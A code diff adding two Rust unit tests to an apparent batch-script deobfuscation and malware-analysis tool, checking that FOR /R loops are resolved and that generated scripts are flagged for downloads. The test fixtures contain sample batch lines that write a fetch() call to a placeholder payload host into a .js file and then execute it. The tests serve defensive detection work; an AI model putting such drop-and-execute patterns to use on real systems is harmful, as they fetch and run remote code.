@@ -15506,6 +15506,49 @@ for /R C:\Work %%F in (*.js) do call %%F"#;
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn for_r_without_root_uses_tracked_files() {
+        let script = br#"echo fetch('https://for-r-noroot.example/payload') > run.js
+for /R %%F in (*.js) do call %%F"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("call run.js"),
+            "FOR /R without root did not substitute tracked file:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://for-r-noroot.example/payload")
+            }),
+            "FOR /R without root did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_r_quoted_root_with_space_uses_tracked_files() {
+        let script =
+            br#"echo fetch('https://for-r-quoted-root.example/payload') > "C:\Work Dir\run.js"
+for /R "C:\Work Dir" %%F in (*.js) do call "%%F""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(r#"call "c:\work dir\run.js""#),
+            "FOR /R quoted root did not substitute tracked file:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://for-r-quoted-root.example/payload")
+            }),
+            "FOR /R quoted root did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
